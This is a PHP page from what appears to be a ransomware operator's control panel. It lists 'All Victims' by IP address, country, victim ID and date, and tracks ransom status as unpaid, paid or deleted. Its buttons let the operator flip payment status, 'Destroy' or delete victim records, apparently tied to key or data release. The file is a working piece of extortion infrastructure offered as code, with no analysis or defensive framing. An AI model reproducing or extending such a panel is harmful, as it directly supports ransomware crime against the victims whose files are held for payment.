<?php include ROOT."content/theme/header.php"; ?>
	<?php if(isset($_SESSION['LOGIN'])){?>
		<div class="wrapper">
            <div class="container">
                <div class="row">
					<div class="span12">
                        <div class="content">
                            <div class="row-fluid">
                                <div class="span12">
                                    <?=$GLOBALS['notice']->showSuccess();?>
                                    <?=$GLOBALS['notice']->showError();?>
                                </div>
                            </div>
							<div class="btn-box-row row-fluid">
                                <div class="row-fluid">
                                    <div class="span12">
										<a href="<?=$GLOBALS['_CONF']['HTTP'];?>" class="btn-box small span2">
											<i class="icon-home"></i><b>Dashboard </b>
                                        </a>
										<a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=ransomware" class="btn-box small span2">
											<i class="icon-group"></i><b>All </b>
                                        </a>
                                    </div>
                                </div>
							</div>
							<div class="module">
                                <div class="module-head">
                                    <h3><i class=" icon-group"></i> All Victims</h3>
                                </div>
                                <div class="module-body table">
                                    <table cellpadding="0" cellspacing="0" border="0" class="datatable-1 table table-bordered table-striped	 display" width="100%" id="example">
                                        <thead>
                                            <tr>
                                                <th width="100">
                                                    IP
                                                </th>
                                                <th width="50">
                                                    Country
                                                </th>
                                                <th width="100">
                                                    ID
                                                </th>
												<th width="300">
                                                    <center>Info</center>
                                                </th>
                                                <th width="100">
                                                    <center>Status</center>
                                                </th>
                                                <th width="100">
                                                    <center>Date</center>
                                                </th>
                                                <th width="100">
                                                    <center>Payment</center>
                                                </th>
                                                <th width="300">
                                                    <center>Options</center>
                                                </th>
                                            </tr>
                                        </thead>
                                        <tbody>
										<?php 
										$db->go("SELECT * FROM victims ORDER BY id DESC");
										while($data = $db->fetchArray()){
										?>
                                            <tr class="">
                                                 <td>
                                                    <b><a target="_blank" href="https://www.geoiptool.com/en/?ip=<?=$data['ip'];?>"><?=$data['ip'];?></a></b>
                                                </td>
												<td>
                                                    <?php
                                                    $country = $data['country'];
                                                    if ($country == "") {
                                                        $country = "XX";
                                                    }
                                                    ?>
                                                    <center><img src="<?=$GLOBALS['_CONF']['HTTP'];?>content/theme/images/flags/<?php echo $country;?>.gif"/></center>
												</td>
                                                <td class="center">
                                                    <?=$data['vid'];?>
                                                </td>
                                                <td class="center">
                                                    <?=$data['info'];?>
                                                </td>
                                                <td class="center">
                                                    <?php
                                                    if($data['status'] == "0") {
                                                        $status = "<b><font color=lime>Unpaid</b></font>";
                                                    } elseif($data['status'] == "1") {
                                                        $status = "<b><font color=gold>Payed</b></font>";
                                                    } elseif($data['status'] == "2") {
                                                        $status = "<b><font color=red>Deleted</b></font>";
                                                    } else {
                                                        $status = "<b><font color=blue>Unknown</b></font>";
                                                    }
                                                    ?>
                                                    <center><?php echo $status;?></center>
                                                </td>
                                                <td class="center">
                                                    <center><?=$data['date'];?></center>
                                                </td>
                                                <td class="center">
                                                    <center>
                                                        <?php if($data['status'] == "0") { ?>
                                                            <a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=victims&do=paid&id=<?=$data['id']*1909;?>&user=<?=$data['vid'];?>&act=1" class="btn btn-success">Paid</a> 
                                                        <?php } elseif($data['status'] == "1") { ?>
                                                            <a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=victims&do=paid&id=<?=$data['id']*1909;?>&user=<?=$data['vid'];?>&act=2" class="btn btn-danger">Unpaid</a> 
                                                        <?php } ?>
                                                    </center>
                                                </td>
												<td class="center">
                                                    <center>
                                                        <a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=victims&do=delete&id=<?=$data['id']*1909;?>&user=<?=$data['vid'];?>&act=2" class="btn btn-danger">Destroy</a> 
                                                        <a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=victims&do=view&id=<?=$data['id']*1909;?>" class="btn btn-success">View</a> 
                                                        <a href="<?=$GLOBALS['_CONF']['HTTP'];?>?page=victims&do=delete&id=<?=$data['id']*1909;?>&user=<?=$data['vid'];?>&act=1" class="btn btn-info">Delete</a>
                                                    </center>
                                                </td>
                                            </tr>    
										<?php 
											}
										?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            <!--/.module-->
						</div>
					</div>
				</div>
			</div>
		</div>
	<?php 
	} else {
		header("location: ".$GLOBALS['_CONF']['HTTP']);
	} ?>
<?php include ROOT."content/theme/footer.php"; ?>